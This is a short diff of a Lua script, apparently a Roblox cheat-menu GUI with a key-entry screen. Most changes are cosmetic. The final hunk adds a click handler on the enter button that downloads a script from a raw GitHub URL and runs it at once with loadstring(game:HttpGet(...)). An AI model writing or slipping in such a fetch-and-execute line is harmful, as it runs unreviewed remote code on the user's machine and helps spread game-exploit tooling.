@@ -704,7 +704,6 @@ end;
 
 local G2L = {};
 
--- StarterGui.MNSGUI
 G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 G2L["1"]["Name"] = [[MNSGUI]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
@@ -713,10 +712,9 @@ G2L["1"]["ResetOnSpawn"] = false;
 
 -- StarterGui.MNSGUI.KeySystem
 G2L["2"] = Instance.new("Frame", G2L["1"]);
-G2L["2"]["Visible"] = false;
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
 G2L["2"]["Size"] = UDim2.new(0, 214, 0, 274);
-G2L["2"]["Position"] = UDim2.new(0.42247, 0, 0.32854, 0);
+G2L["2"]["Position"] = UDim2.new(0.445, 0, 0.329, 0);
 G2L["2"]["BorderColor3"] = Color3.fromRGB(87, 87, 87);
 G2L["2"]["Name"] = [[KeySystem]];
 
@@ -853,6 +851,10 @@ local script = G2L["7"];
 	end
 	
 	enterButton.MouseButton1Click:Connect(onButtonClick)
+	
+	enterButton.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/nobodylovesanymore/scriptt/refs/heads/main/bigechese', true))()
+	end)
 	
 end;
 task.spawn(C_7);
